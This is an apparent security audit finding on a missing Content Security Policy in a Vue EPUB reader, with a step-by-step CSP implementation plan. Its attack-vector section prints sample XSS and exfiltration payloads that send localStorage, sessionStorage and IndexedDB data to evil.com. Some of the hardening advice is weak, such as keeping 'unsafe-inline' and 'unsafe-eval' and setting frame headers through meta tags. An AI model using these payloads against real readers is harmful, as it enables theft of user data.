# Missing Content Security Policy

## Severity
High

## Affected Files
- `index.html` (no CSP meta tag)
- `vite.config.ts` (no security headers configuration)

## Description
The application lacks a Content Security Policy (CSP), which is a critical security mechanism that helps prevent Cross-Site Scripting (XSS), clickjacking, and other code injection attacks.

Without CSP:
1. No restriction on inline scripts
2. No restriction on external resource loading
3. No restriction on where scripts can be loaded from
4. No protection against eval() and similar dangerous functions
5. No restriction on form submissions
6. No frame embedding controls

## Current State
```html
<!-- index.html - No CSP header -->
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="A static, client-side EPUB reader hosted on GitHub Pages" />
    <title>EpubWebReader</title>
    <!-- NO CONTENT SECURITY POLICY -->
  </head>
```

```typescript
// vite.config.ts - No security headers
export default defineConfig({
  // ... configuration ...
  server: {
    port: 3000,
    open: true,
  },
  // NO HEADERS CONFIGURATION
});
```

## Potential Attack Vectors

### 1. XSS via EPUB Content
Without CSP, malicious EPUB files can execute JavaScript through various vectors:
```html
<!-- Example malicious EPUB content -->
<script>
  fetch('https://evil.com/steal?data=' + btoa(localStorage.getItem('reader-preferences')));
</script>

<img src=x onerror="fetch('https://evil.com/steal')">
```

### 2. Data Exfiltration
```javascript
// Attacker can exfiltrate user data to any domain
fetch('https://evil.com/exfil', {
  method: 'POST',
  body: JSON.stringify({
    localStorage: localStorage,
    sessionStorage: sessionStorage,
    indexedDB: await getAllIndexedDB()
  })
});
```

### 3. Loading Malicious External Resources
```html
<!-- EPUB can load malicious scripts from external domains -->
<script src="https://evil.com/malware.js"></script>
<link rel="stylesheet" href="https://evil.com/phishing.css">
```

### 4. Clickjacking via Frame Embedding
Attackers can embed the application in a transparent iframe:
```html
<iframe src="https://your-epub-reader.com" style="opacity:0"></iframe>
<!-- Trick users into clicking on invisible elements -->
```

### 5. Mixed Content Vulnerabilities
```html
<!-- EPUB can load HTTP resources even on HTTPS pages -->
<img src="http://evil.com/tracker.gif">
```

## Implementation Plan

### Step 1: Add CSP meta tag to index.html
Update `index.html`:
```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="A static, client-side EPUB reader hosted on GitHub Pages" />
    
    <!-- CONTENT SECURITY POLICY -->
    <meta http-equiv="Content-Security-Policy" 
          content="
            default-src 'self';
            script-src 'self' 'unsafe-inline' 'unsafe-eval';
            style-src 'self' 'unsafe-inline' 'unsafe-hashes';
            img-src 'self' blob: data: https:;
            connect-src 'self';
            font-src 'self' data:;
            media-src 'self';
            object-src 'none';
            base-uri 'self';
            form-action 'self';
            frame-ancestors 'none';
            frame-src 'none';
            worker-src 'self' blob:;
            manifest-src 'self';
            upgrade-insecure-requests;
            block-all-mixed-content;
            report-uri /csp-report
          ">
    
    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
    <meta http-equiv="X-Frame-Options" content="DENY" />
    <meta http-equiv="X-XSS-Protection" content="1; mode=block" />
    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin" />
    <meta name="referrer" content="strict-origin-when-cross-origin" />
    
    <title>EpubWebReader</title>
  </head>
```

### Step 2: Create CSP configuration file
Create `src/config/csp.ts`:
```typescript
/**
 * Content Security Policy Configuration
 * 
 * This file defines the CSP directives for the application.
 * Modify these directives carefully as they control what resources
 * the application can load and execute.
 */

export interface CSPConfig {
  defaultSrc: string[];
  scriptSrc: string[];
  styleSrc: string[];
  imgSrc: string[];
  connectSrc: string[];
  fontSrc: string[];
  objectSrc: string[];
  frameSrc: string[];
  frameAncestors: string[];
  baseUri: string[];
  formAction: string[];
  reportUri?: string;
}

/**
 * Default CSP configuration
 */
export const defaultCSPConfig: CSPConfig = {
  defaultSrc: ["'self'"],
  scriptSrc: [
    "'self'",
    "'unsafe-inline'",  // Required for Vue template compilation
    "'unsafe-eval'"    // Required for some Vue operations
  ],
  styleSrc: [
    "'self'",
    "'unsafe-inline'",  // Required for Tailwind CSS and inline styles
    "'unsafe-hashes'"   // Allow specific hashed inline styles
  ],
  imgSrc: [
    "'self'",
    'blob:',           // For cover images and chapter images
    'data:',           // For small inline images from EPUB
    'https:'           // For external images from EPUB content
  ],
  connectSrc: [
    "'self'"
    // Add your API domains here if needed
    // 'https://api.example.com'
  ],
  fontSrc: [
    "'self'",
    'data:'            // For embedded fonts from EPUB
  ],
  objectSrc: [
    "'none'"           // Block all plugins (Flash, Java, etc.)
  ],
  frameSrc: [
    "'none'"           // Block iframe embedding
  ],
  frameAncestors: [
    "'none'"           // Prevent clickjacking
  ],
  baseUri: [
    "'self'"           // Restrict base URL
  ],
  formAction: [
    "'self'"           // Restrict form submissions
  ],
  reportUri: '/csp-report'  // CSP violation reporting endpoint
};

/**
 * Generate CSP header string from configuration
 */
export function generateCSPHeader(config: CSPConfig): string {
  const directives = [
    `default-src ${config.defaultSrc.join(' ')}`,
    `script-src ${config.scriptSrc.join(' ')}`,
    `style-src ${config.styleSrc.join(' ')}`,
    `img-src ${config.imgSrc.join(' ')}`,
    `connect-src ${config.connectSrc.join(' ')}`,
    `font-src ${config.fontSrc.join(' ')}`,
    `object-src ${config.objectSrc.join(' ')}`,
    `frame-src ${config.frameSrc.join(' ')}`,
    `frame-ancestors ${config.frameAncestors.join(' ')}`,
    `base-uri ${config.baseUri.join(' ')}`,
    `form-action ${config.formAction.join(' ')}`,
    'upgrade-insecure-requests',
    'block-all-mixed-content'
  ];

  if (config.reportUri) {
    directives.push(`report-uri ${config.reportUri}`);
  }

  return directives.join('; ');
}

/**
 * Generate CSP meta tag content
 */
export function generateCSPTag(config: CSPConfig): string {
  return generateCSPHeader(config);
}

/**
 * Strict CSP configuration (for production)
 * 
 * This is a stricter CSP that removes 'unsafe-inline' and 'unsafe-eval'
 * Requires proper setup of nonce or hash-based inline scripts/styles
 */
export const strictCSPConfig: CSPConfig = {
  ...defaultCSPConfig,
  scriptSrc: ["'self'"],  // No unsafe-inline or unsafe-eval
  styleSrc: ["'self'", "'unsafe-inline'"]  // Keep for styles, but not scripts
};

/**
 * Development CSP configuration
 * 
 * More permissive for development with Vite HMR
 */
export const devCSPConfig: CSPConfig = {
  ...defaultCSPConfig,
  scriptSrc: [
    "'self'",
    "'unsafe-inline'",
    "'unsafe-eval'",
    'ws:',  // For Vite HMR WebSocket
    'http://localhost:*',
    'http://127.0.0.1:*'
  ],
  connectSrc: [
    "'self'",
    'ws:',  // WebSocket for HMR
    'http://localhost:*',
    'http://127.0.0.1:*'
  ]
};

/**
 * Get CSP configuration based on environment
 */
export function getCSPConfig(isDevelopment: boolean = false): CSPConfig {
  return isDevelopment ? devCSPConfig : defaultCSPConfig;
}
```

### Step 3: Update Vite config with security headers
Update `vite.config.ts`:
```typescript
import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';
import { resolve } from 'path';
import { generateCSPHeader, devCSPConfig } from './src/config/csp';

export default defineConfig(({ mode }) => {
  const isDev = mode === 'development';
  
  return {
    plugins: [vue()],
    resolve: {
      alias: {
        '@': resolve(__dirname, 'src'),
        'epubjs': resolve(__dirname, 'node_modules/epubjs/dist/epub.js'),
      },
    },
    base: '/EpubWebReader/',
    build: {
      outDir: 'docs',
      sourcemap: false,
      rollupOptions: {
        output: {
          manualChunks: {
            epub: ['epubjs'],
          },
        },
      },
    },
    optimizeDeps: {
      exclude: ['epubjs'],
    },
    server: {
      port: 3000,
      open: true,
      headers: {
        'Content-Security-Policy': generateCSPHeader(devCSPConfig),
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': 'geolocation=(), microphone=(), camera=(), payment=()',
        'Strict-Transport-Security': isDev ? '' : 'max-age=31536000; includeSubDomains'
      }
    },
    preview: {
      headers: {
        'Content-Security-Policy': generateCSPHeader(devCSPConfig),
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': 'geolocation=(), microphone=(), camera=(), payment=()',
        'Strict-Transport-Security': isDev ? '' : 'max-age=31536000; includeSubDomains'
      }
    }
  };
});
```

### Step 4: Create CSP violation reporter (optional)
Create `src/utils/cspReporter.ts`:
```typescript
/**
 * CSP Violation Reporter
 * 
 * Reports CSP violations to console or sends to a monitoring service
 */

export interface CSPViolationReport {
  'csp-report': {
    documentURI?: string;
    referrer?: string;
    blockedURI?: string;
    violatedDirective?: string;
    effectiveDirective?: string;
    originalPolicy?: string;
    disposition?: string;
    blockedURL?: string;
    statusCode?: number;
    lineNumber?: number;
    columnNumber?: number;
    sourceFile?: string;
    sample?: string;
  };
}

/**
 * Log CSP violation to console
 */
export function logCSPViolation(violation: CSPViolationReport): void {
  const report = violation['csp-report'];
  
  console.group('🚨 CSP Violation Detected');
  console.error('Document URI:', report.documentURI);
  console.error('Violated Directive:', report.violatedDirective);
  console.error('Blocked URI:', report.blockedURI);
  console.error('Source File:', report.sourceFile);
  console.error('Line:', report.lineNumber, 'Column:', report.columnNumber);
  console.error('Sample:', report.sample);
  console.groupEnd();
}

/**
 * Report CSP violation to external service
 */
export async function reportCSPViolation(
  violation: CSPViolationReport,
  endpoint: string
): Promise<void> {
  try {
    await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/csp-report',
      },
      body: JSON.stringify(violation),
      keepalive: true
    });
  } catch (error) {
    console.warn('Failed to report CSP violation:', error);
  }
}

/**
 * Initialize CSP violation listener
 */
export function initCSPReporter(endpoint?: string): void {
  if (typeof document === 'undefined') return;

  document.addEventListener('securitypolicyviolation', (event) => {
    const violation: CSPViolationReport = {
      'csp-report': {
        documentURI: document.documentURI,
        referrer: document.referrer,
        blockedURI: event.blockedURI,
        violatedDirective: event.violatedDirective,
        effectiveDirective: event.effectiveDirective,
        originalPolicy: event.originalPolicy,
        disposition: event.disposition,
        blockedURL: event.blockedURI,
        statusCode: event.statusCode,
        lineNumber: event.lineNumber,
        columnNumber: event.columnNumber,
        sourceFile: event.sourceFile,
        sample: event.sample
      }
    };

    logCSPViolation(violation);

    if (endpoint) {
      reportCSPViolation(violation, endpoint);
    }
  });
}
```

### Step 5: Initialize CSP reporter in main.ts
Update `src/main.ts`:
```typescript
import { createApp } from 'vue';
import { createPinia } from 'pinia';
import App from './App.vue';
import './styles/main.css';
import { initCSPReporter } from './utils/cspReporter';

const app = createApp(App);
const pinia = createPinia();

app.use(pinia);
app.mount('#app');

// Initialize CSP violation reporter
// Uncomment to enable reporting to external endpoint
// initCSPReporter('/api/csp-report');

// For development, just log violations
initCSPReporter();
```

### Step 6: Create CSP testing utility
Create `src/utils/cspTester.ts`:
```typescript
/**
 * CSP Testing Utility
 * 
 * Helper functions to test CSP configuration
 */

/**
 * Test if inline scripts are blocked
 */
export function testInlineScript(): void {
  console.log('Testing inline script blocking...');
  try {
    // This should be blocked by CSP
    const script = document.createElement('script');
    script.textContent = 'console.log("Inline script executed - CSP VIOLATION")';
    document.head.appendChild(script);
    console.log('✓ Inline script test: Script executed (CSP allows it or not enforced)');
  } catch (error) {
    console.log('✓ Inline script test: Script blocked by CSP');
  }
}

/**
 * Test if eval is blocked
 */
export function testEval(): void {
  console.log('Testing eval blocking...');
  try {
    // This should be blocked by CSP
    const result = eval('1 + 1');
    console.log(`✓ Eval test: Eval executed (result: ${result}, CSP allows it or not enforced)`);
  } catch (error) {
    console.log('✓ Eval test: Eval blocked by CSP');
  }
}

/**
 * Test if inline styles are allowed
 */
export function testInlineStyles(): void {
  console.log('Testing inline styles...');
  try {
    // This should be allowed by CSP
    const div = document.createElement('div');
    div.style.color = 'red';
    document.body.appendChild(div);
    console.log('✓ Inline styles test: Styles applied (CSP allows it)');
    div.remove();
  } catch (error) {
    console.log('✗ Inline styles test: Styles blocked by CSP');
  }
}

/**
 * Test if external images are blocked
 */
export function testExternalImages(): void {
  console.log('Testing external image loading...');
  const img = new Image();
  img.onload = () => {
    console.log('✓ External image test: Image loaded (CSP allows it)');
  };
  img.onerror = () => {
    console.log('✓ External image test: Image blocked by CSP');
  };
  // Test with a common external image
  img.src = 'https://via.placeholder.com/1';
}

/**
 * Run all CSP tests
 */
export function runAllCSPTests(): void {
  console.group('🧪 CSP Security Tests');
  testInlineScript();
  testEval();
  testInlineStyles();
  testExternalImages();
  console.groupEnd();
  console.log('📝 Check browser console for CSP violation reports');
}

/**
 * Log current CSP
 */
export function logCurrentCSP(): void {
  const metaTag = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
  if (metaTag) {
    console.log('Current CSP:', metaTag.getAttribute('content'));
  } else {
    console.log('No CSP meta tag found');
  }

  // Check response headers (requires server inspection)
  console.log('📝 Check network tab for CSP response headers');
}
```

### Step 7: Create GitHub Pages _headers file
Create `docs/.nojekyll` (if not exists) and `docs/_headers`:
```
# docs/_headers - GitHub Pages security headers
/*
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  X-XSS-Protection: 1; mode=block
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=()
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  
# Note: CSP is handled via meta tag in index.html
# GitHub Pages doesn't support custom response headers
```

## Additional Recommendations

### 1. Gradual CSP Migration
Start with a report-only mode to test without blocking:
```html
<meta http-equiv="Content-Security-Policy-Report-Only" 
      content="...">
```

### 2. Nonce-based CSP (Future Enhancement)
Remove 'unsafe-inline' by using nonces for inline scripts:
```typescript
// In build process, generate nonces
const nonce = crypto.randomUUID();

// Add nonce to inline scripts
document.querySelector('script').nonce = nonce;
```

### 3. Hash-based CSP
Precompute hashes for known inline scripts:
```html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self' 'sha256-abc123...'">
```

### 4. Regular CSP Audits
- Monitor CSP violation reports
- Adjust policy based on legitimate traffic
- Remove overly permissive directives

## CSP Directives Explained

| Directive | Purpose | Recommended Value |
|-----------|---------|------------------|
| `default-src` | Fallback for all other directives | `'self'` |
| `script-src` | Controls script loading | `'self' 'unsafe-inline' 'unsafe-eval'` |
| `style-src` | Controls style loading | `'self' 'unsafe-inline'` |
| `img-src` | Controls image loading | `'self' blob: data: https:` |
| `connect-src` | Controls fetch/axios/WebSocket | `'self'` |
| `font-src` | Controls font loading | `'self' data:` |
| `object-src` | Blocks plugins | `'none'` |
| `frame-src` | Blocks iframes | `'none'` |
| `frame-ancestors` | Prevents clickjacking | `'none'` |
| `base-uri` | Restricts base URL | `'self'` |
| `form-action` | Restricts form submission | `'self'` |
| `upgrade-insecure-requests` | Forces HTTPS | - |
| `block-all-mixed-content` | Blocks HTTP on HTTPS | - |

## Related Issues
- See also: `xss-via-unsafe-innerhtml-bookviewer.md` (Content sanitization)
- See also: `missing-sanitization-epub-content.md` (EPUB content security)
